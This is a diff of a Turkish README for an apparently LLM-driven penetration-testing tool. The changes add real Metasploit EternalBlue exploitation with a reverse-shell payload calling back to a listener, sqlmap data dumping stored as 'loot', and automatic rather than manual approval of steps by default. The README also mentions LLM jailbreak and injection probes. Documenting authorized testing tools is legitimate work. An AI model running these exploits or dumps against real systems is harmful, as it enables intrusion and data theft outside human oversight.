@@ -82,16 +82,26 @@ oluşturup bu `.bat`'i hedef gösterebilirsin.
 kalkan chat --target example.com
 ```
 
+Açılışta **kalkan (shield) ASCII grafiği** + renkli durum; her adım canlı
+akar (`[i/N] araç.yetenek → durum`, renkli risk/sonuç):
+
 ```
 kalkan(example.com)> web uygulamasını tara
-   ... model düşünüyor → plan → passive/active OTOMATIK çalışır
-   🗒  (Türkçe özet + "Sonraki adım:" önerisi)
+   ... model düşünüyor → plan (renkli) → adımlar canlı [1/8]… [8/8]
+   🗒  Bulgular / Geçilebilir (exploitable) / Eksik-zayıf / Sonraki adım
    rapor: reports\example.com_20261031-152033.md
 ```
 
-Risk modeli: **passive/active otomatik**, **intrusive/destructive satır-içi onay** ister.
-Slash komutları: `/target`, `/risk`, `/auto`, `/ozet`, `/plan`, `/feed`, `/scope [add <hedef>]`, `/help`, `/quit`.
-Başlatma bayrakları: `--from-feed` (canlı CVE önerileri), `--dry-run`, `--max-risk`, `--no-summary`, `--no-report`.
+Risk modeli: **passive/active otomatik**. Onay varsayılan **OTOMATIK**
+(yavaş taramalarda alt-süreç stdin'i tüketip onayı EOF'la reddediyordu;
+`/auto off` ile elle onaya dönülür). `destructive` yine `--allow-destructive`
++ scope `max_risk` ister.
+Slash komutları: `/target`, `/risk`, `/auto`, `/arg k=v`, `/arm`, `/ozet`,
+`/plan`, `/feed`, `/scope [add <hedef>]`, `/help`, `/quit`.
+`/arm` = `verify=1` kısayolu (sqlmap+dalfox'u silahlar); `/arg module=… dump=1`
+ile diğer saldırı adımları silahlanır.
+Başlatma bayrakları: `--from-feed`, `--dry-run`, `--max-risk`,
+`--allow-destructive`, `--no-summary`, `--no-report`. Renk otomatik; `NO_COLOR` kapatır.
 
 ### 3.1 Kapsam dosyası
 
@@ -176,9 +186,12 @@ reports/<hedef>_<YYYYAAGG-SSDDSS>.md
 ```
 
 İçerik: plan adımları tablosu · adım sonuçları · keşifler (açık portlar, WAF,
-bulgular) · (sohbette) model özeti · plan notları. Hedef+tarih isimlendirme
+bulgular) · (sohbette) bulgu-odaklı model özeti · plan notları. Gerçek istismar
+çıktısı varsa (sqlmap `--dump` verisi, msf oturum/konsol logu) **loot** olarak
+`reports/loot/<hedef>_<tarih>/` altına ayrı dosyalara kaydedilir ve raporda
+"Loot / Elde Edilen Veri" bölümünde listelenir. Hedef+tarih isimlendirme
 geçmişe dönük arşiv verir. `--dry-run`'da yazılmaz, `--no-report` ile kapatılır.
-`reports/` git'e girmez (hedef bilgisi içerir).
+`reports/` git'e girmez (hedef/loot bilgisi içerir).
 
 ### 3.8 Canlı besleme — CVE/CVSS + ATT&CK/ATLAS akışı
 
@@ -234,25 +247,47 @@ Doğrulama: `kalkan tools` (hepsini tek bakışta), ya da `nmap --version`, `nuc
 
 ---
 
-## 5. Metasploit kullanımı
+## 5. Saldırı katmanı — Metasploit / sqlmap
 
-Varsayılan mod **`check`**: modül hedefe uygulanabilir mi diye sorar, exploit çalıştırmaz.
+Mod **yeteneğe** bağlıdır (argümanla bypass edilemez):
+
+| Yetenek | Araç | Risk | Ne yapar |
+|---|---|---|---|
+| `exploit_check` | msf | INTRUSIVE | Daima `check`: modül hedefe uygulanabilir mi, doğrular (exploit çalıştırmaz) |
+| `exploit_run` | msf | **DESTRUCTIVE** | Gerçek exploit → oturum açar; `post` ile oturumda keşif (sysinfo/getuid) |
+| `sqli_dump` | sqlmap | **DESTRUCTIVE** | `--dump` ile gerçek veri çeker |
+| `auxiliary_scan` | msf | INTRUSIVE | Yardımcı modül (ör. smb_version) |
+
+**Kurulum:** Metasploit'i WSL2'ye kur (Windows'ta Defender/MDM engeller) — bkz.
+[`docs/KURULUM.md`](docs/KURULUM.md) §3.5. Kalkan `msfconsole`'u Windows PATH'inde
+veya WSL dağıtımında otomatik bulur.
+
+**Gerçek saldırı için 5 kapı (hepsi ayrı ayrı gerekir):**
+1. `scope.json` → `"max_risk": "destructive"`  2. `--allow-destructive`
+3. onay (chat'te auto / `run --yes`)  4. açık silahlama (`--arg module=…` / `--arg dump=1`)
+5. hedef scope içinde. Biri eksikse plan durur.
 
 ```powershell
-# 1) modülü doğrula (intrusive → onay ister)
+# modül doğrula (INTRUSIVE → onay ister)
 python -m kalkan.cli --scope examples/scope.json run --yes `
   --technique T1190 --target 10.10.10.20 `
   --module auxiliary/scanner/smb/smb_version
 
-# 2) exploit (yalnızca açıkça istersen)
-python -m kalkan.cli --scope examples/scope.json run `
+# GERÇEK exploit (DESTRUCTIVE → scope destructive + --allow-destructive şart)
+python -m kalkan.cli --scope examples/scope.json run --yes --allow-destructive `
   --technique T1190 --target 10.10.10.20 `
-  --module exploit/windows/smb/ms17_010_eternalblue `
-  --mode run --allow-intrusive
+  --arg module=exploit/windows/smb/ms17_010_eternalblue `
+  --arg payload=windows/x64/meterpreter/reverse_tcp `
+  --arg lhost=10.10.10.5 --arg lport=4444 --arg post=1
+
+# GERÇEK veri çekme (DESTRUCTIVE)
+python -m kalkan.cli --scope examples/scope.json run --yes --allow-destructive `
+  --technique T1190 --target http://10.10.10.20 --arg dump=1
 ```
 
-Üretilen `.rc` dosyası sonuç içinde `rc_script` olarak döner; denetim için saklanabilir.
-`--allow-destructive` verilmedikçe `destructive` seviyesindeki hiçbir aksiyon geçmez.
+Üretilen `.rc` sonuçta `rc_script` olarak döner; oturum/dump çıktısı **loot**
+olarak `reports/loot/` altına kaydedilir. `--allow-destructive` ve scope
+`max_risk=destructive` verilmedikçe hiçbir `destructive` aksiyon geçmez.
 
 ---
 
@@ -293,9 +328,13 @@ python -m kalkan.cli run --dry-run --yes --technique AML.T0054 `
 Kalkan iki bilgi tabanını da **resmi STIX dağıtımlarından** besler; API anahtarı gerekmez:
 
 ```powershell
-# ATT&CK enterprise (~55 MB): tum teknikler, aciklama + tespit notlariyla
+# ATT&CK enterprise (~55 MB): TAM icerik — 227 teknik + 479 alt, 15 taktik,
+# 268 mitigasyon, ~17.600 prosedur ornegi (aciklama/nasil-yapildigi + tespit +
+# veri kaynaklari + mitigasyonlar + grup/yazilim prosedur ornekleri)
 python -m kalkan.cli knowledge fetch
-python -m kalkan.cli knowledge show --technique T1046
+python -m kalkan.cli knowledge fetch --domain mobile   # 78+47 teknik
+python -m kalkan.cli knowledge fetch --domain ics      # 78+26 teknik
+python -m kalkan.cli knowledge show --technique T1190  # tam icerik + ornekler
 python -m kalkan.cli knowledge search -q "port scan"
 
 # ATLAS tam katalog (~1.6 MB): teknik + mitigation + case study
@@ -309,10 +348,11 @@ python -m kalkan.cli knowledge atlas
 
 - Kaynak: `mitre-attack/attack-stix-data` ve `mitre-atlas/atlas-data` GitHub depoları (resmi).
 - Önbellek: `~/.kalkan/attack/` ve `~/.kalkan/atlas/`; `--force` ile yeniden indirir.
-- `knowledge show --domain atlas` çıktısında tekniğin açıklaması, tüm
-  mitigasyonları (AML.M…), onu kullanan case study'ler ve kuretilmiş
-  çekirdeğdeki test yöntemi gösterilir.
-- Diğer ATT&CK domain'leri: `--domain mobile`, `--domain ics`.
+- `knowledge show` (ATT&CK) çıktısında: açıklama (nasıl yapıldığı), tespit,
+  platform, veri kaynakları, gerekli izin, aşılan savunma, alt/üst teknik,
+  **mitigasyonlar (M…)** ve **prosedür örnekleri** (hangi grup/yazılım nasıl
+  kullanmış) gösterilir. ATLAS'ta ayrıca case study'ler ve test yöntemi.
+- Diğer ATT&CK domain'leri: `--domain mobile`, `--domain ics` (ikisi de tam içerik).
 - Arama boşlukla ayrılan kelimeleri VE olarak değerlendirir; isim
   eşleşmeleri önce, açıklama eşleşmeleri sonra gelir.
 
@@ -390,7 +430,8 @@ kalkan/
 ├─ policy.py            Policy, PolicyDenied (onay eşiği)
 ├─ audit.py             AuditLog (SHA-256 hash zinciri, verify/tail)
 ├─ registry.py          ToolSpec, Registry (yetenek → adaptör)
-├─ report.py            tarama → Markdown rapor (reports/<hedef>_<tarih>.md)
+├─ report.py            tarama → Markdown rapor + loot (reports/, reports/loot/)
+├─ ui.py                terminal renk + kalkan grafiği + canlı adım ilerlemesi
 ├─ adapters/
 │  ├─ base.py           Adapter: command()/parse()/run()/dry_run()
 │  ├─ nmap.py           port_scan (-sT), service_version, vuln_script, host_discovery
@@ -398,9 +439,10 @@ kalkan/
 │  ├─ httpx.py          http_probe, tech_detect
 │  ├─ ffuf.py / arjun.py / dalfox.py / nikto.py / wafw00f.py
 │  ├─ webprobe.py       security_headers, cors_check, http_methods, tls_inspect…
-│  ├─ sqlmap.py         sqli_check (opt-in: verify)
+│  ├─ sqlmap.py         sqli_check (verify), sqli_dump (DESTRUCTIVE: --dump→loot)
 │  ├─ shodan.py         passive_osint (domain→IP), host_lookup, exposure_lookup
-│  ├─ msf.py            exploit_check, auxiliary_scan, exploit_run (.rc üretimi)
+│  ├─ msf.py            exploit_check(check) / exploit_run(DESTRUCTIVE,oturum+post)
+│  │                    / auxiliary_scan · WSL çalıştırıcı (wsl -d <distro>)
 │  └─ llmprobe.py       llm_jailbreak_probe, llm_injection_probe, llm_leak_probe…
 ├─ knowledge/
 │  ├─ attack.py         ATT&CK STIX 2.1 yükleyici + önbellek (~/.kalkan/attack)
@@ -428,8 +470,11 @@ kalkan/
 **ATT&CK:** T1595, T1595.001, T1595.002, T1590, T1596, T1046, T1592, T1190, T1203, T1698, T1699
 **ATLAS:** AML.T0051, AML.T0054, AML.T0057 (otomatik) + 5 teknik manuel olarak belgelenmiş
 
-`knowledge fetch` ile güncel ATT&CK STIX verisi iner (enterprise/mobile/ics); `knowledge show --technique T1046`
-açıklama, taktik, platform ve varsa playbook'u gösterir.
+`knowledge fetch` ile ATT&CK STIX verisi iner (enterprise/mobile/ics) ve **tam
+içerik** yüklenir: her teknik için açıklama (nasıl yapıldığı), tespit, veri
+kaynakları, mitigasyonlar ve gerçek prosedür örnekleri. `knowledge show
+--technique T1190` hepsini + varsa playbook'u gösterir. Bunların **hepsi
+referans**; otomatik çalıştırılabilir playbook ise kürlenmiş çekirdektedir.
 
 ---
 
